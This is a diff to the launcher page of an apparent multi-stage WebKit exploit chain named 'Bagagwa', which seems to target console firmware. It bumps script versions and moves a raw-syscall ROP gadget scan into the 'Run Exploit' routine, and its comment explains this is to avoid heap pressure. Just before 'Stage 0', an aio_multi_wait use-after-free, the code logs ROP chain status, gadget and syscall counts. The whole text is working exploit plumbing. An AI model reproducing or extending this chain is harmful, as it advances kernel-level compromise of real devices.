@@ -106,7 +106,7 @@ try {
 <!-- classic scripts: rop.js defines worker_rop globally, main.js detects
      firmware, injects the offset script, and defines prepare() globally -->
 <script src="rop.js?v=raw1"></script>
-<script src="main.js?v=raw2"></script>
+<script src="main.js?v=raw3"></script>
 <script>
 window.offsetsReady = new Promise(function (res, rej) {
     var s = document.querySelector('script[src*="offsets/"]');
@@ -466,7 +466,7 @@ async function init() {
         log("chain operational, pid=" + pid.s32 +
             " gadgets=" + Object.keys(P.gadgets).length +
             " syscalls=" + Object.keys(P.syscalls).length +
-            " raw=" + (P.rawSyscall ? "1(syscall gadget found)" : "0(NOT found)"), "step");
+            " raw=deferred(scan on Run Exploit)", "step");
         try { await psNotify("Bagagwa: WebKit OK pid=" + pid.s32); } catch(e) {}
         setStatus("ready — press Run Exploit", "");
         btnEl.disabled = false;
@@ -484,7 +484,7 @@ async function runExploit() {
     log("\n=== BAGAGWA MULTI CHAIN EXPLOIT ===\n", "stage-hdr");
 
     try {
-        const { makeBagagwaEngine } = await import("./bagagwa.js?v=raw1");
+        const { makeBagagwaEngine } = await import("./bagagwa.js?v=raw2");
 
         const driver = { core: 5, origMaskBytes: null, coreWhy: "default" };
 
@@ -498,6 +498,12 @@ async function runExploit() {
         };
 
         const engine = makeBagagwaEngine(ctx);
+
+        // Raw-syscall gadget scan runs HERE (after WebKit settled), never in
+        // prepare() at WebKit-finish — that is where the heap is tightest.
+        try { if (typeof P.scanRawGadgets === "function") P.scanRawGadgets(); } catch (e) {}
+        log("raw syscall path: " + (P.rawSyscall ? "available (syscall;ret found)" : "NOT found"),
+            P.rawSyscall ? "step" : "warn");
 
         log("\n--- Stage 0: aio_multi_wait UAF ---\n", "stage-hdr");
         const s0 = await engine.stage0_uaf();
